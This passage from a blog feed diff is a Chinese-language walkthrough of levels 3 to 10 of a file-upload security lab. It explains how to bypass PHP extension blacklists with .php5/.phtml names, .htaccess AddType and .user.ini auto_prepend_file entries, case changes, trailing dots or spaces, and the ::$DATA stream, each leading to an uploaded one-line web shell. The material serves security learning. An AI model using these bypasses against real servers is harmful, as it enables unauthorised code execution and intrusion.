+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;deldot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;删除文件名末尾的点&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strrchr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;转换为小写&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;str_ireplace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;去除字符串&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DATA&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;收尾去空&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;trim函数，由于后面没有跟规定从字符串中删除哪些字符，则移除以下所有字符：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;ldquo;\0&amp;rdquo; - NULL&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;\t&amp;rdquo; - 制表符&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;\n&amp;rdquo; - 换行&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;\x0B&amp;rdquo; - 垂直制表符&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;\r&amp;rdquo; - 回车&lt;/li&gt;
+&lt;li&gt;&amp;quot; &amp;quot; - 空格&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;$_FILES[&amp;lsquo;upload_file&amp;rsquo;] [&amp;rsquo;name&amp;rsquo;]中传入的是客户端的原文件名字&lt;/p&gt;
+&lt;p&gt;但是由于它没有屏蔽.php5 .php3 .phtml这种后缀，所以我们可以进行绕过，直接修改php后缀为.php5上传用蚁剑连接。&lt;/p&gt;
+&lt;p&gt;但是注意此关要用phpstudy 2018进行，并且在apache服务器的配置文件httpd-conf中将&lt;/p&gt;
+&lt;p&gt;AddType application/x-httpd-php .php 后加入.phtml .php5 .jpg这样就可以解析.php5 .phtml后缀的文件了，并且php的版本中不能带nts。&lt;/p&gt;
+&lt;h2 id=&#34;第四关&#34;&gt;第四关
+&lt;/h2&gt;&lt;p&gt;第四关在第三关的基础上屏蔽了.php5 .php3 .phtml等文件后缀&lt;/p&gt;
+&lt;p&gt;但是没有过滤.htaccess文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%B8%80.jpg&#34;
+	width=&#34;1566&#34;
+	height=&#34;851&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%B8%80_hu8006654324711718045.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%B8%80_hu6702220127819809209.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;184&#34;
+		data-flex-basis=&#34;441px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;.htaccess文件：指在特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录&lt;/p&gt;
+&lt;p&gt;我们可以在.htaccess中写入&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AddType application/x-httpd-php .php .phtml .php5 .jpg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这样就可以把这些文件当作php解析，再上传带有一句话木马的.jpg文件用蚁剑连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg&#34;
+	width=&#34;1542&#34;
+	height=&#34;1040&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%BA%8C_hu4796111132851221857.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%BA%8C_hu12338129446818177195.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;148&#34;
+		data-flex-basis=&#34;355px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;注意！！！.htaccess前不要带前缀比如1.htaccess！！&lt;/p&gt;
+&lt;h2 id=&#34;第五关-1&#34;&gt;第五关
+&lt;/h2&gt;&lt;p&gt;第一种&lt;/p&gt;
+&lt;p&gt;通过.user.ini进行绕过，进行此上传的前提有该上传目录必须要有php文件且.user,.ini得生效。&lt;/p&gt;
+&lt;p&gt;并且php版本在5.的不能成功注入，在试了7.1.13版本可以注入，要查看自己的php版本是否可以使.user.ini生效可以去输入url加phpinfo.php，查看里面server api是否是CGI/FastCGI。&lt;/p&gt;
+&lt;p&gt;php.ini是php的一个全局配置文件，.user.ini和.htaccess都是配置文件，.user.ini是用户自定义的一个php.ini。通过创建一个.user.ini文件在里面写入&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auto_prepend_file = 5.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;5.jpg是我们创建的一个包含一句话木马的jpg文件&lt;/p&gt;
+&lt;p&gt;上传上去，打开图片链接，并且把图片名字改为readme.php用蚁剑链接这个地址就可以了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D.jpg&#34;
+	width=&#34;2052&#34;
+	height=&#34;1521&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu3169477242542636411.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu1567906440052582812.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;134&#34;
+		data-flex-basis=&#34;323px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;第二种&lt;/p&gt;
+&lt;p&gt;注意！！这种绕过7.1.13版本不能，5.4.45可以&lt;/p&gt;
+&lt;p&gt;由于它的过滤不是循环过滤，而是只过滤一次就结束，可以使用. .进行绕过&lt;/p&gt;
+&lt;p&gt;这是由于Windows会帮我们把文件后面的.自动删除&lt;/p&gt;
+&lt;p&gt;如果我们上传一个1.php. .文件，根据它的过滤规则，首先获取我们上传的文件名，再删除后面的.，这时我们获取的是1.php. ，再由&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;strrchr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;；&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们获得.后面的的也就是. ，再将首尾去空我们最终得到 $file_name为1.php.&lt;/p&gt;
+&lt;p&gt;$file_ext中存的值为.。由下面的代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$img_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;UPLOAD_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;根据上路径和$file_name进行拼接则可以成功绕过&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg&#34;
+	width=&#34;1545&#34;
+	height=&#34;1044&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%BA%8C_hu9858319392119760028.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%BA%8C_hu8538718243075948422.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;147&#34;
+		data-flex-basis=&#34;355px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;第六关&#34;&gt;第六关
+&lt;/h2&gt;&lt;p&gt;第六关很简单，也是黑名单但是没有前几关的大小写判断，所以抓包修改文件后缀为.phP 就可以绕过&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$file_ext = strtolower($file_ext); //转换为小写
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;注意！！！第六关如果访问上传文件出现500错误，换成nginx服务器或者降低版本&lt;/p&gt;
+&lt;h2 id=&#34;第七关&#34;&gt;第七关
+&lt;/h2&gt;&lt;p&gt;第七关发现没有进行空格删除&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; $file_ext = trim($file_ext); //收尾去空
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;所有以抓包在文件后缀后面加入一个空格就可以绕过。&lt;/p&gt;
+&lt;h2 id=&#34;第八关-1&#34;&gt;第八关
+&lt;/h2&gt;&lt;p&gt;这一关比前几关少了一个删除.的函数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$file_name = deldot($file_name);//删除文件名末尾的点
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;所以我们可以抓包在上传文件后缀后加一个.进行绕过。&lt;/p&gt;
+&lt;h2 id=&#34;第九关-1&#34;&gt;第九关
+&lt;/h2&gt;&lt;p&gt;在Windows系统中，文件名后面跟一个“::$DATA“,表示文件的一个附加的数据流，大部分文件操作工具不会意识到这些数据流。&lt;/p&gt;
+&lt;p&gt;我们可以上传php文件抓包在其后缀后面加入::$DATA，就可以成功被解析。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%B8%80.jpg&#34;
+	width=&#34;1491&#34;
+	height=&#34;817&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%B8%80_hu17532858797620327117.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%B8%80_hu1368130694619756820.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;182&#34;
+		data-flex-basis=&#34;437px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在windows系统下我们上传的这个后缀的后面::$DATA会自动被删除。&lt;/p&gt;
+&lt;p&gt;连接成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg&#34;
+	width=&#34;1545&#34;
+	height=&#34;1044&#34;
+	srcset=&#34;https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%BA%8C_hu17732477942075817712.jpg 480w, https://baoanleo.github.io/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%BA%8C_hu8376879913200890441.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Photo&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;147&#34;
+		data-flex-basis=&#34;355px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;第十关&#34;&gt;第十关
+&lt;/h2&gt;&lt;p&gt;第十关和第五关第二种方法一样&lt;/p&gt;
+&lt;p&gt;第二种&lt;/p&gt;
+&lt;p&gt;注意！！这种绕过7.1.13版本不能，5.4.45可以&lt;/p&gt;
+&lt;p&gt;由于它的过滤不是循环过滤，而是只过滤一次就结束，可以使用. .进行绕过&lt;/p&gt;
+&lt;p&gt;这是由于Windows会帮我们把文件后面的.自动删除&lt;/p&gt;
+&lt;p&gt;如果我们上传一个1.php. .文件，根据它的过滤规则，首先获取我们上传的文件名，再删除后面的.，这时我们获取的是1.php. ，再由&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;strrchr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;；&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们获得.后面的的也就是. ，再将首尾去空我们最终得到 $file_name为1.php.&lt;/p&gt;
+&lt;p&gt;$file_ext中存的值为.。由下面的代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$img_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;UPLOAD_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;根据上路径和$file_name进行拼接则可以成功绕过&lt;/p&gt;
+</description>
         </item>
         <item>
         <title>Testimg</title>
